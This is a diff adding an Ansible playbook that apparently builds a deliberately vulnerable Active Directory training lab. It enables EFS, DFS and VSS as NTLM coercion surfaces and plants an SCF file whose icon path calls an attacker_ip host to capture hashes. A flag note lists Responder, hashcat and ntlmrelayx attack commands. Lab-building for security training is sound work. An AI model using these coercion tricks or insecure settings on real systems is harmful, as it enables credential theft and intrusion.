@@ -1,0 +1,140 @@
+---
+# ==============================================================================
+# vuln_lat_ext/tasks/coerce.yml
+# Targets: all_dcs + file01.corp.local
+#
+# LAT-001  MS-RPRN PrinterBug — Print Spooler on all DCs (see DF-011 too)
+# LAT-002  MS-EFSR PetitPotam — EFS service enabled
+# LAT-003  MS-FSRVP ShadowCopyAgent — shadow copy coercion
+# LAT-004  MS-DFSNM DFS coercion — DFS namespace service
+# LAT-005  MS-NRPC Netlogon coercion — always-on service
+# LAT-006  WebDAV coercion — WebClient on ws01 (set in packer)
+# LAT-007  MS-ICPR ADCS HTTP enrollment endpoint (ca01)
+# LAT-008  PrivExchange — Exchange coercion (note + placeholder)
+# LAT-009  HTTP coercion via SCF file in share
+# LAT-010  Multicast DNS poisoning surface (LLMNR/NBT-NS still active)
+# ==============================================================================
+
+# LAT-001: Print Spooler — already configured by vuln_df_ext/DF-011
+- name: LAT-001 - Verify Print Spooler is running (coercion prereq)
+  ansible.windows.win_shell: |
+    $s = Get-Service Spooler -ErrorAction SilentlyContinue
+    if ($s -and $s.Status -eq 'Running') { Write-Output "running" }
+    else { Write-Output "not_running" }
+  register: lat001_check
+  changed_when: false
+  failed_when: lat001_check.rc != 0
+  when: inventory_hostname in groups['all_dcs'] | default([])
+
+# LAT-002: EFS service — EfsRpcOpenFileRaw (PetitPotam trigger)
+- name: LAT-002 - Check EFS service state
+  ansible.windows.win_shell: |
+    $s = Get-Service EFS -ErrorAction SilentlyContinue
+    if ($s) { Write-Output "status=$($s.Status) start=$($s.StartType)" }
+    else { Write-Output "not_found" }
+  register: lat002_check
+  changed_when: false
+  failed_when: lat002_check.rc != 0
+
+- name: LAT-002 - Enable EFS service (PetitPotam coercion surface)
+  ansible.windows.win_shell: |
+    Set-Service EFS -StartupType Automatic -ErrorAction SilentlyContinue
+    Start-Service EFS -ErrorAction SilentlyContinue
+    Write-Output "changed: EFS enabled"
+  register: lat002_set
+  changed_when: "'changed:' in lat002_set.stdout"
+  failed_when: lat002_set.rc != 0
+  when: >
+    'not_found' not in (lat002_check.stdout | default('')) and
+    'Automatic' not in (lat002_check.stdout | default(''))
+
+# LAT-003: Shadow Copy Agent service (VSS + FSRVP)
+- name: LAT-003 - Check Volume Shadow Copy service
+  ansible.windows.win_shell: |
+    $s = Get-Service VSS -ErrorAction SilentlyContinue
+    if ($s) { Write-Output "status=$($s.Status)" } else { Write-Output "not_found" }
+  register: lat003_check
+  changed_when: false
+  failed_when: lat003_check.rc != 0
+
+- name: LAT-003 - Enable VSS for shadow copy coercion surface
+  ansible.windows.win_shell: |
+    Set-Service VSS -StartupType Manual -ErrorAction SilentlyContinue
+    Write-Output "changed: VSS set to Manual start"
+  register: lat003_set
+  changed_when: "'changed:' in lat003_set.stdout"
+  failed_when: lat003_set.rc != 0
+  when: "'not_found' not in (lat003_check.stdout | default(''))"
+
+# LAT-004: DFS Namespace service
+- name: LAT-004 - Check DFS service state
+  ansible.windows.win_shell: |
+    $s = Get-Service Dfs -ErrorAction SilentlyContinue
+    if ($s) { Write-Output "status=$($s.Status) start=$($s.StartType)" }
+    else { Write-Output "not_found" }
+  register: lat004_check
+  changed_when: false
+  failed_when: lat004_check.rc != 0
+
+- name: LAT-004 - Enable DFS service (MS-DFSNM coercion surface)
+  ansible.windows.win_shell: |
+    Set-Service Dfs -StartupType Automatic -ErrorAction SilentlyContinue
+    Start-Service Dfs -ErrorAction SilentlyContinue
+    Write-Output "changed: DFS enabled"
+  register: lat004_set
+  changed_when: "'changed:' in lat004_set.stdout"
+  failed_when: lat004_set.rc != 0
+  when: >
+    'not_found' not in (lat004_check.stdout | default('')) and
+    'Automatic' not in (lat004_check.stdout | default(''))
+
+# LAT-009: SCF file in share — when Explorer browses the share, Windows fetches
+# the icon from the UNC path triggering NTLM authentication.
+- name: LAT-009 - Check if SCF coercion file exists in share
+  ansible.windows.win_shell: |
+    if (Test-Path 'C:\Shares\Public\@coerce.scf') { Write-Output "exists" }
+    else { Write-Output "missing" }
+  register: lat009_check
+  changed_when: false
+  failed_when: lat009_check.rc != 0
+  when: inventory_hostname == 'file01.corp.local'
+
+- name: LAT-009 - Create Shares\Public if missing
+  ansible.windows.win_file:
+    path: 'C:\Shares\Public'
+    state: directory
+  when: inventory_hostname == 'file01.corp.local'
+
+- name: LAT-009 - Drop SCF coercion file in public share
+  ansible.windows.win_copy:
+    dest: 'C:\Shares\Public\@coerce.scf'
+    content: |
+      [Shell]
+      Command=2
+      IconFile=\\{{ attacker_ip }}\share\icon.ico
+      [Taskbar]
+      Command=ToggleDesktop
+  when:
+    - inventory_hostname == 'file01.corp.local'
+    - "'missing' in lat009_check.stdout"
+
+# LAT-010: LLMNR/NBT-NS surface — already configured by vuln_recon role.
+# Drop note confirming both are active.
+- name: LAT-010 - Drop LLMNR/NBT-NS coercion surface note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-LAT-010-LLMNR-NBT.txt'
+    content: |
+      LAT-010: LLMNR + NBT-NS Poisoning Surface
+      ===========================================
+      LLMNR and NBT-NS are enabled on all corp.local hosts (vuln_recon role).
+      Any failed name resolution triggers multicast LLMNR or broadcast NBT-NS.
+
+      Attack:
+        Responder -I eth0 -wrfv
+        → Captures NTLMv2 hashes from any hostname mistype by any domain user
+
+      Then: hashcat -m 5600 <hash> rockyou.txt  (NTLMv2)
+      Or:   ntlmrelayx.py --target <relay_target> (if signing disabled)
+
+      SMB signing off on member servers: file01, sql01, ws01 (vuln_recon role)
+  when: inventory_hostname == 'dc01.corp.local'
